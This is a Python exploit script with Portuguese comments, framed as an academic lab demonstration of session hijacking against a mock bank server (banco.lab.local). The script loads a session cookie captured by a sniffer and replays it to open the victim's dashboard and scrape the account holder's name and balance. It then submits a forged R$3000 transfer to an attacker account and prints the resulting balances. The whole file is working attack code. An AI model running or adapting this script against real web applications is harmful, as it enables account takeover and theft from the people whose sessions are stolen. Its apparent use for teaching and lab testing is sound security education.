#!/usr/bin/env python3
"""
Módulo de Exploração: Sequestro de Sessão (Session Hijacking)
Demonstração empírica de violação de confidencialidade e integridade (Hodges et al., 2012; Stallings, 2014)
"""

import os
import sys
import requests
from bs4 import BeautifulSoup

SERVER_IP = "172.20.0.10"
SERVER_HOST = "banco.lab.local"
BASE_URL = f"http://{SERVER_IP}"  # Conexão direta via IP ou Host
COOKIE_FILE = "/tmp/ultimo_cookie.txt"

VERDE = "\033[92m"
VERMELHO = "\033[91m"
AMARELO = "\033[93m"
AZUL = "\033[94m"
CIANO = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def banner():
    print(f"\n{VERMELHO}{BOLD}======================================================{RESET}")
    print(f"{VERMELHO}{BOLD}   EXPLOIT: SEQUESTRO DE SESSÃO (SESSION HIJACKING)   {RESET}")
    print(f"{VERMELHO}{BOLD}======================================================{RESET}")
    print(f"Alvo:            {BASE_URL} ({SERVER_HOST})")
    print(f"Conta Atacante:  atacante@fraude.org (Invasor Malicioso)")
    print(f"{VERMELHO}------------------------------------------------------{RESET}\n")


def obter_token_sessao():
    # Tenta ler do arquivo gravado pelo sniffer
    if os.path.exists(COOKIE_FILE):
        try:
            with open(COOKIE_FILE, "r") as f:
                token = f.read().strip()
                if token:
                    print(f"{VERDE}[+] Token de sessão encontrado automaticamente no arquivo de captura:{RESET}")
                    print(f"    {BOLD}{token}{RESET}")
                    confirm = input(f"\nDeseja utilizar este token? [S/n]: ").strip().lower()
                    if confirm != "n":
                        return token
        except Exception:
            pass

    # Caso contrário, solicita ao operador
    token = input(f"{AMARELO}[?] Digite o 'session_id' capturado no bettercap ou sniffer:{RESET} ").strip()
    return token


def executar_sequestro(session_id, valor_fraude=3000.00):
    if not session_id:
        print(f"{VERMELHO}[-] Token de sessão inválido ou vazio!{RESET}")
        return

    cookies = {"session_id": session_id}
    headers = {
        "Host": SERVER_HOST,
        "User-Agent": "Mozilla/5.0 (Kali Linux; X11) Gecko/20100101 Firefox/115.0"
    }

    print(f"\n{CIANO}[*] 1. Tentando acessar o /dashboard da vítima usando APENAS o cookie de sessão...{RESET}")
    try:
        r = requests.get(f"{BASE_URL}/dashboard", cookies=cookies, headers=headers, timeout=5, allow_redirects=False)
        
        if r.status_code == 302 or "login" in r.headers.get("Location", ""):
            print(f"{VERMELHO}[-] Falha no Sequestro! O cookie fornecido não possui sessão autenticada ativa no servidor.{RESET}")
            return False

        if r.status_code == 200:
            print(f"{VERDE}{BOLD}[+] SEQUESTRO DE SESSÃO BEM-SUCEDIDO! ACESSO TOTAL À CONTA DA VÍTIMA!{RESET}")
            
            # Tenta extrair dados do HTML
            try:
                soup = BeautifulSoup(r.text, "html.parser")
                saldo_el = soup.find(class_="display-6")
                saldo_texto = saldo_el.get_text(strip=True) if saldo_el else "Não identificado"
                nome_el = soup.find("h2", class_="fw-bold")
                nome_texto = nome_el.get_text(strip=True) if nome_el else "Alexsandro Patrício (Vítima)"
                print(f"    Titular da Conta: {BOLD}{nome_texto}{RESET}")
                print(f"    Saldo Disponível: {BOLD}{VERDE}{saldo_texto}{RESET}")
            except Exception:
                print(f"    Página carregada com status 200 OK.")
        else:
            print(f"{VERMELHO}[-] Resposta inesperada do servidor: {r.status_code}{RESET}")
            return False

    except Exception as e:
        print(f"{VERMELHO}[-] Erro de conexão com o servidor alvo: {e}{RESET}")
        return False

    # 2. Executa a transferência fraudulenta (desvio de fundos)
    print(f"\n{VERMELHO}{BOLD}[*] 2. Executando Fraude Financeira via Session Hijacking...{RESET}")
    print(f"    Transferindo R$ {valor_fraude:.2f} da conta da vítima para 'atacante@fraude.org'...")

    payload = {
        "destinatario": "atacante@fraude.org",
        "valor": valor_fraude
    }

    try:
        post_headers = {**headers, "Accept": "application/json"}
        r_transf = requests.post(
            f"{BASE_URL}/transferir",
            data=payload,
            cookies=cookies,
            headers=post_headers,
            timeout=5
        )

        if r_transf.status_code == 200:
            print(f"\n{VERDE}{BOLD}[🚨 TRANSAÇÃO FRAUDULENTA CONCLUÍDA COM SUCESSO! 🚨]{RESET}")
            print(f"    O invasor transferiu fundos sem saber a senha e sem consentimento da vítima!")
            
            # Consulta novo status do servidor
            r_status = requests.get(f"{BASE_URL}/api/status", headers=headers, timeout=5)
            if r_status.status_code == 200:
                dados = r_status.json()
                print(f"\n{BOLD}=== IMPACTO FINANCEIRO COMPROVADO NO SISTEMA ==={RESET}")
                print(f"  Novo Saldo da Vítima:   {VERMELHO}R$ {dados['saldo_vitima']:.2f}{RESET} (Diminuiu!)")
                print(f"  Novo Saldo do Atacante: {VERDE}R$ {dados['saldo_atacante']:.2f}{RESET} (Aumentou!)")
            return True
        else:
            print(f"{VERMELHO}[-] Falha na transferência: Código {r_transf.status_code}{RESET}")
            print(r_transf.text)
            return False
            
    except Exception as e:
        print(f"{VERMELHO}[-] Erro ao submeter transferência forjada: {e}{RESET}")
        return False


if __name__ == "__main__":
    banner()
    token = obter_token_sessao()
    if token:
        executar_sequestro(token)
    else:
        print(f"{VERMELHO}Nenhum token fornecido. Abortando.{RESET}")
